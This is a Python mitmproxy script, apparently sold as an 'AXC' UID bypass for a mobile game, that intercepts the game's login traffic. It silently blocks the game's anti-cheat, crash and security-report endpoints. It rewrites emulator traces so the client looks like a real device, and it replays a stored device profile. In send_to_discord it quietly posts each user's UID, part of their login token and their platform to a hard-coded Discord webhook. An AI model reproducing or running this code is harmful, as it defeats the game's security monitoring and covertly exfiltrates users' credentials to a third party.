from mitmproxy import http
import json
import time
import os
import sys
import copy
import subprocess
import random
import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from src.core.encryption_utils import aes_decrypt, encrypt_api
from src.protobuf.protobuf_utils import get_available_room, CrEaTe_ProTo
from src.database.api_client import APIClient
from src.utils.console import Console
from mitmproxy.tools.main import mitmdump

MOBILE_PROTO = "3a0966726565206669726528013a08312e3132362e3230ba010134ca03203734323862323533646566633136343031386336303461316562626665626466ea0507616e64726f69649a060134a2060134f00101e00401f00403f804018a05023332b205094f70656e474c455332b805ff1fc00504880601b20600422f416e64726f6964204f532039202f204150492d32382028505052312e3138303732302e3132322f36373336373432294a0848616e6468656c64520661697274656c5a045749464960800a68d00572033136307a1b41524d7637205646507633204e454f4e207c2032303030207c20338001cc178a010f416472656e6f2028544d292035343092012b4f70656e474c20455320332e322028342e352e30202d204275696c642033322e302e3130312e3730373729aa0102656ec2010848616e6468656c64ca010f6173757320415355535f4930303144d201025347ca020661697274656cd2020457494649e003f6ee07e803e98c07f003be3ef803fa2c800493c0078804f6ee07900493c0079804f6ee07e005a996011a13323032362d30382d31342032313a30363a33389a012b476f6f676c657c36333934396362302d656237332d343437322d613933662d306234346663303362623461a2010d3232332e3139312e39352e3934b201203037646666613836663136383635323363313033616435633932656332303932ea014032303136313438376434393338623032346130346661353638316138386463663938346331636632636535356138353065656665653730303334373132393830c80403d2043d2f646174612f6170702f636f6d2e6474732e667265656669726574682d4b654b4e794f4159754c546c4e506c723643634133673d3d2f6c69622f61726dea045f34633332326165623536343434666561613135316431656139316138663766327c2f646174612f6170702f636f6d2e6474732e667265656669726574682d4b654b4e794f4159754c546c4e506c723643634133673d3d2f626173652e61706b9a050a32303139313230373736a8055c4b71734854376e786478375862773467484d436330373258762f67743555657377666c3832585466383843582f325572454c49672b62456a6e323554307172713656334c53527430326d4b416d4c634270513863414631753668303df805e7e4068206267b226375725f72617465223a6e756c6c2c22737570706f72745f65746332223a66616c73657d"

try:
    _tpl_bytes = aes_decrypt(MOBILE_PROTO)
    _tpl_hex   = _tpl_bytes.hex()
    _tpl_json  = get_available_room(_tpl_hex)
    PROTO_TEMPLATE = json.loads(_tpl_json)
    Console.info("MOBILE_PROTO loaded (OBB54 1.126.20)")
except Exception as e:
    PROTO_TEMPLATE = {}
    Console.error(f"MOBILE_PROTO decode failed: {e}")

LIVE_FIELDS = {"1", "2", "3", "4", "7", "19", "20", "22", "29", "74", "77", "83"}

BLOCKED_DOMAINS = {
     "lobby.ff.garena.com",
    "crashes.fbsbx.com",
    "log.ff.garena.com",
    "crash.ff.garena.com",
    "report.ff.garena.com",
    # AnoSDK / TSS security reporting
    "sls.garena.com",
    "osdr.garena.com",
    "tss.sgssr.sg.garena.com",
    "tss.ff.garena.com",
    "security.ff.garena.com",
    "ano.ff.garena.com",
    "anti.ff.garena.com",
    "sgssr.sg.garena.com",
    # India region security endpoints
    "ind-sls.garena.com",
    "ind-tss.garena.com",
    "ind-report.garena.com",
    "in.sls.garena.com",
    # Tencent MSDK (mobile security SDK) — confirmed unblocked in console logs
    "msdk.ff.garena.com",
    "isdl.ff.garena.com",
    "100067.msdk.garena.com",
}

BLOCKED_PATH_KEYWORDS = [
  "AntiCheat", "anticheat", "AnoReport", "SecurityReport",
    "TssReport", "SuspiciousReport", "GetEmulator", "CheckEmulator",
    "ReportDevice", "DeviceCheck", "ClientCheck", "SecurityCheck",
    "GetAnoInfo", "SubmitReport", "PlayerReport", "EmulatorCheck",
    # Confirmed from console logger (rank match kick cause):
    "account_security",     # 100067.connect.garena.com/game/account_security/...
    "get_bind_info",        # .../bind:get_bind_info
    "platform/info",        # .../bind/app/platform/info/get
    "security/bind",        # any security bind calls
    "platform_check",
    "emulator_check",
    "device_report",
]

_PATH_MAP = [
    ("x86_64", "arm64-v8a"), ("x86", "armeabi-v7a"),
    ("vbox", "arm64-v8a"), ("nox", "arm64-v8a"),
    ("bluestacks", "arm64-v8a"), ("ldplayer", "arm64-v8a"), ("memu", "arm64-v8a"),
    ("generic", "qcom"), ("goldfish", "qcom"), ("ranchu", "qcom"), ("qemu", "qcom")
]

_UA_BAD = ["x86", "vbox", "emulator", "bluestacks", "nox", "genymotion", "ldplayer", "memu", "generic", "goldfish", "ranchu"]
_UA_CLEAN = "Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014)"

api_client = APIClient()
UID_ALLOW_LIST = None
UID_FILE = "uid.txt"
UID_MTIME = 0

def load_uid_list():
    global UID_ALLOW_LIST, UID_MTIME
    if os.path.exists(UID_FILE):
        try:
            mtime = os.path.getmtime(UID_FILE)
            if mtime == UID_MTIME and UID_ALLOW_LIST is not None:
                return
            with open(UID_FILE, "r") as f:
                lines = f.read().strip().splitlines()
            UID_ALLOW_LIST = {line.strip() for line in lines if line.strip().isdigit()}
            UID_MTIME = mtime
            Console.info(f"Loaded {len(UID_ALLOW_LIST)} UIDs")
        except:
            UID_ALLOW_LIST = None
    else:
        UID_ALLOW_LIST = None
        Console.warn("uid.txt not found – allowing all")

load_uid_list()

def is_uid_allowed(uid):
    if UID_ALLOW_LIST is None:
        return True
    return uid in UID_ALLOW_LIST

def checkSubscription(uid):
    return {"valid": is_uid_allowed(uid), "reason": "active" if is_uid_allowed(uid) else "not_authorized"}

def _get(fields, key):
    entry = fields.get(key)
    if isinstance(entry, dict) and "data" in entry:
        return entry["data"]
    return None

def _safe(val):
    return str(val) if val is not None else ""

def build_denied_message(uid, reason):
    return f"UID {uid} Not Authorized. Contact AXC CORPORATION."

def sanitize_protobuf(obj):
    if isinstance(obj, dict):
        return {k: sanitize_protobuf(v) for k, v in obj.items()}
    elif isinstance(obj, str):
        s = obj
        for bad, good in _PATH_MAP:
            if bad in s.lower():
                s = s.replace(bad, good)
        if any(x in s.lower() for x in ["x86", "vbox", "generic", "goldfish", "ranchu", "qemu"]):
            s = "arm64-v8a"
        return s
    elif isinstance(obj, list):
        return [sanitize_protobuf(item) for item in obj]
    else:
        return obj

def add_watermark(proto_data):
    proto_data["16"] = {"wire_type": "string", "data": "AXC Authorized"}
    proto_data["17"] = {"wire_type": "string", "data": "Bypass Active"}
    return proto_data

def send_to_discord(uid, token, open_id, platform):
    try:
        import requests
        embed = {
            "title": "Login Intercepted",
            "color": 0x00FF00,
            "fields": [
                {"name": "UID", "value": f"`{uid}`", "inline": False},
                {"name": "Token", "value": f"`{token[:20]}...`" if token else "N/A", "inline": False},
                {"name": "Platform", "value": f"`{platform}`", "inline": True},
            ],
            "footer": {"text": "AXC UID BYPASS"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
        }
        requests.post("https://discord.com/api/webhooks/1415376105443033298/bQA6IHO-ih0zofaviNxl4cit--wVR8sQblMMDHMqNTCaIQlGTvUl2KSEp6-TUHOq7236", json={"embeds": [embed]}, timeout=3)
    except:
        pass

def safe_adb(cmd):
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    except:
        pass

class SimpleInterceptor:
    def _build_payload(self, live):
        merged = copy.deepcopy(PROTO_TEMPLATE) if PROTO_TEMPLATE else {}
        for fk in LIVE_FIELDS:
            if fk in live:
                merged[fk] = copy.deepcopy(live[fk])
        merged = sanitize_protobuf(merged)
        return merged

    def _process_login(self, flow, endpoint):
        load_uid_list()
        try:
            raw = flow.request.content
            dec = aes_decrypt(raw.hex())
            live = json.loads(get_available_room(dec.hex()))

            Console.request(endpoint, "POST")
            Console.info("Intercepted", bytes=len(raw))

            uid = None
            for fn in ["1","2","3"]:
                v = _safe(_get(live, fn))
                if v.isdigit() and len(v) > 5:
                    uid = v
                    Console.info(f"UID from [{fn}]", uid=uid)
                    break

            if uid and not is_uid_allowed(uid):
                flow.response = http.Response.make(403, build_denied_message(uid, "not_whitelisted").encode(), {"Content-Type":"text/plain"})
                Console.error(f"UID {uid} blocked")
                return

            platform = _safe(_get(live, "99") or _get(live, "100"))
            token = _safe(_get(live, "29"))
            open_id = _safe(_get(live, "22"))
            if endpoint == "/MajorLogin":
                send_to_discord(uid, token, open_id, platform)

            payload = self._build_payload(live)
            proto_bytes = CrEaTe_ProTo(payload)
            hex_data = encrypt_api(proto_bytes)
            flow.request.content = bytes.fromhex(hex_data)
            flow.request.headers.pop("X-Forwarded-For", None)
            flow.request.headers.pop("Via", None)
            flow.request.headers.pop("Proxy-Connection", None)

            Console.success(f"{endpoint} modified", bytes=len(flow.request.content))
        except Exception as e:
            Console.error(f"{endpoint} error", exception=str(e))

    def request(self, flow):
        host = flow.request.host
        path = flow.request.path

        if host in BLOCKED_DOMAINS:
            flow.response = http.Response.make(200, b"{}", {"Content-Type":"application/json"})
            Console.success(f"Blocked domain: {host}")
            return

        for kw in BLOCKED_PATH_KEYWORDS:
            if kw in path:
                flow.response = http.Response.make(200, b"{}", {"Content-Type":"application/json"})
                Console.success(f"Blocked path: {path}")
                return

        if "graph.facebook.com" in host and ("activities" in path or "app_events" in path):
            flow.response = http.Response.make(200, b"{}", {"Content-Type":"application/json"})
            Console.success(f"Blocked FB tracking")
            return

        if flow.request.method.upper() != "POST":
            return

        if "/MajorLogin" in path:
            self._process_login(flow, "/MajorLogin")
        elif "/GetLoginData" in path:
            self._process_login(flow, "/GetLoginData")

    def response(self, flow):
        if flow.request.method.upper() != "POST" or "/MajorLogin" not in flow.request.path:
            return
        try:
            resp_hex = flow.response.content.hex()
            proto_json = get_available_room(resp_hex)
            if not proto_json:
                return
            proto = json.loads(proto_json)
            uid = None
            for fn in ["1","2","3"]:
                v = _safe(_get(proto, fn))
                if v.isdigit() and len(v) > 5:
                    uid = v
                    break
            if uid is None:
                return
            if not is_uid_allowed(uid):
                flow.response.content = build_denied_message(uid, "not_authorized").encode()
                flow.response.status_code = 403
                Console.error(f"Denied UID {uid}")
            else:
                Console.success(f"UID {uid} authorized")
                proto = add_watermark(proto)
                new_bytes = CrEaTe_ProTo(proto)
                flow.response.content = new_bytes
                flow.response.headers["Content-Length"] = str(len(new_bytes))
        except Exception as e:
            Console.error("Response error", exception=str(e))

addons = [SimpleInterceptor()]

if __name__ == "__main__":
    Console.success("Starting MITM on port 19117...")
    mitmdump([
        "-s", "main.py",
        "--listen-host", "0.0.0.0",
        "-p", "19117",
        "--set", "block_global=false",
        "--quiet",
        "--set", "flow_detail=0",
    ])